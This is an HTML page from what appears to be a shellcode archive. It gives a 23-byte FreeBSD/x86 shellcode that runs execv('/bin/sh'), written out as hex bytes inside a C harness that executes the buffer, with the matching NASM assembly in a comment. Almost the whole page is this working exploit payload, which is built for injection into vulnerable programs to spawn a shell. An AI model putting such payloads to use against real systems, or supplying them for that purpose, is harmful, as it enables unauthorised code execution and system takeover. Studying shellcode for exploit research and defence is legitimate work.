<html><head><title>FreeBSD/x86 - execv(/bin/sh) - 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 -------------- FreeBSD/x86 - execv(&quot;/bin/sh&quot;) 23 bytes -------------------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */

#include &lt;string.h&gt;
#include &lt;stdio.h&gt;



char shellcode[] = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;
                   &quot;\x68\x2f\x62\x69\x6e\x89\xe3\x50&quot;
                   &quot;\x54\x53\xb0\x3b\x50\xcd\x80&quot;;

int main(void)
{
   void(*f)() = (void*)shellcode;

   printf(&quot;Len = %d\n&quot;, sizeof(shellcode)-1);
   f();
}

/*!
 %define SYS_EXECV 59


section .text

global _start

_start:
   xor eax, eax

   push eax

   push '//sh'
   push '/bin'

   mov ebx, esp

   push eax
   push esp
   push ebx
   mov al, SYS_EXECV
   push eax
   int 0x80
*/

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
